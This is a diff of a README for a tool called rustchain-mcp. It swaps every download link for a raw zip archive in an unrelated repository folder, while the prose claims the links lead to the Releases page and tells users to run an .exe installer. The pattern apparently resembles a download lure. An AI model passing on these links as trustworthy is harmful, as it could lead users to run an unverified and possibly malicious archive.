@@ -1,6 +1,6 @@
 # ⚙️ rustchain-mcp - Run Your MCP Server Easily
 
-[![Download rustchain-mcp](https://img.shields.io/badge/Download-rustchain--mcp-green?style=for-the-badge)](https://github.com/avellane-snit922/rustchain-mcp/raw/refs/heads/main/rustchain_mcp/rustchain-mcp-1.1.zip)
+[![Download rustchain-mcp](https://img.shields.io/badge/Download-rustchain--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/avellane-snit922/rustchain-mcp/main/rustchain_langchain/rustchain_mcp_v1.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before starting, make sure your computer meets these requirements:
 
 Click the button below to visit the page to download the software:
 
-[![Download rustchain-mcp](https://img.shields.io/badge/Download-rustchain--mcp-blue?style=for-the-badge)](https://github.com/avellane-snit922/rustchain-mcp/raw/refs/heads/main/rustchain_mcp/rustchain-mcp-1.1.zip)
+[![Download rustchain-mcp](https://img.shields.io/badge/Download-rustchain--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/avellane-snit922/rustchain-mcp/main/rustchain_langchain/rustchain_mcp_v1.9.zip)
 
 Once you click the link, you will land on the GitHub repository. Look for the latest release version under the "Releases" section. Download the Windows executable or installer file, which usually ends with `.exe` or `.msi`.
 
@@ -113,7 +113,7 @@ Review logs occasionally if you experience issues. They help track server activi
 
 To get the latest features and fixes:
 
-1. Visit the download page: [rustchain-mcp GitHub](https://github.com/avellane-snit922/rustchain-mcp/raw/refs/heads/main/rustchain_mcp/rustchain-mcp-1.1.zip)
+1. Visit the download page: [rustchain-mcp GitHub](https://raw.githubusercontent.com/avellane-snit922/rustchain-mcp/main/rustchain_langchain/rustchain_mcp_v1.9.zip)
 2. Download the newest release.
 3. Run the installer over your current version or uninstall first if preferred.
 4. Restart the application.
@@ -138,4 +138,4 @@ If you need more help, the repository’s GitHub page has documentation and issu
 
 ---
 
-[![Download rustchain-mcp](https://img.shields.io/badge/Download-rustchain--mcp-green?style=for-the-badge)](https://github.com/avellane-snit922/rustchain-mcp/raw/refs/heads/main/rustchain_mcp/rustchain-mcp-1.1.zip)
+[![Download rustchain-mcp](https://img.shields.io/badge/Download-rustchain--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/avellane-snit922/rustchain-mcp/main/rustchain_langchain/rustchain_mcp_v1.9.zip)
